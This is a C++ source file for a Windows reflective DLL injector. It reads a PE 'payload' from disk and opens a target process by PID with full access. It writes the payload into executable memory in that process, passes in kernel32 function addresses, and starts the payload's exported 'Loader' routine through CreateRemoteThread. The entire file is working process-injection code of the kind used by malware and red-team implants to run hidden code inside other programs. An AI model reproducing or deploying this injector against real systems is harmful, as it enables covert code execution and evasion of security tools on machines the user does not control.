#include <windows.h>
#include <stdio.h>
#include "walkexports.h"

BYTE* LoadFileBytes(LPWSTR filePath, DWORD* dwSize){
    HANDLE hFile = NULL;
    wprintf(L"[*] Loading binary payload: %S\n", filePath);

    hFile = CreateFileW(
        filePath, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);

    if (!hFile) {
        wprintf(L"[!] Could not open payload: %S\n", filePath);
        return NULL;
    }
        // Note the maximum size in bytes is 2^32 
        // this is about 4 GB?
        *dwSize = GetFileSize(hFile, NULL);
        DWORD dwBytesRead = 0;
        BYTE* buffer = (BYTE*) ::HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, *dwSize);

        if (! ::ReadFile(hFile, buffer, *dwSize, &dwBytesRead, NULL)) {
            wprintf(L"[!] Could not read file: %d!\n", ::GetLastError());
            HeapFree(::GetProcessHeap(), 0 ,buffer);
            buffer = NULL;
        }
    
    CloseHandle(hFile);
    return buffer;
}


int wmain(int argc, WCHAR* argv[]){
    auto reflectiveLoader = "RL";

     if (argc != 3){
        wprintf(L"Usage: %S <path_to_pe> <pid> \n", argv[0]);
        return 0;
    }
    DWORD dwFileSize = 0;
    BYTE* fileBytes = LoadFileBytes(argv[1], &dwFileSize);
    wprintf(L"[+] File size: %d bytes\n", dwFileSize);
    if (!fileBytes){
        return 0;
    } 
   
    //DWORD id =  GetCurrentProcessId();
    DWORD id =  DWORD(_wtoi(argv[2]));
     printf("Injecting to PID: %i\n",id);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,id);
	LPVOID lpBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        dwFileSize, 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE
        );
    if(! lpBuffer){
        wprintf(L"[!] Failed ot allocate memory! %d\n", ::GetLastError());
        return 0 ;
    }
    WriteProcessMemory(hProcess, lpBuffer, fileBytes, dwFileSize, NULL);
    // calculate the offset of the exported function

    // we need a few functions to get started 
    HMODULE hKernel32 = ::LoadLibraryA("kernel32.dll");
    FARPROC loadLibraryA = ::GetProcAddress(hKernel32, "LoadLibraryA");
    wprintf(L"[+] Address of LoadLibraryA: %p\n", (void*) loadLibraryA);
    FARPROC getProcAddress = ::GetProcAddress(hKernel32, "GetProcAddress");
    FARPROC virtualAlloc = ::GetProcAddress(hKernel32, "VirtualAlloc");
    FARPROC virtualProtect = ::GetProcAddress(hKernel32, "VirtualProtect");
    wprintf(L"[+] Address of GetProcAddress: %p\n", (void*) loadLibraryA);
    UINT_PTR modules[4] = {(UINT_PTR)loadLibraryA, (UINT_PTR)getProcAddress, (UINT_PTR)virtualAlloc, (UINT_PTR) virtualProtect };
    wprintf(L"[+] Sizeof the args: %d\n", sizeof(modules));
    // We simply pass the address of LoadLibrayA and GetProcAddress to the Reflective Loader 
    LPVOID lpArgs = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(modules), 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE
        );
    WriteProcessMemory(hProcess, lpArgs, modules, sizeof(modules), NULL);
    DWORD functionRVA = (DWORD) WalkExportTable(fileBytes, "Loader");
    //MessageBoxA(NULL, "Injecting!", "", MB_OK);
    UINT_PTR startAddress = (UINT_PTR) lpBuffer +functionRVA ;
    wprintf(L"[!] Injecting into %p\n", (void*)startAddress );
    auto hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE) (startAddress ),
        lpArgs,
        0,
        NULL
        );
    WaitForSingleObject(hThread, INFINITE);
    //VirtualFreeEx()
    wprintf(L"Injection Complete!\n");
    ::FreeLibrary(hKernel32);
    Sleep(1000);


}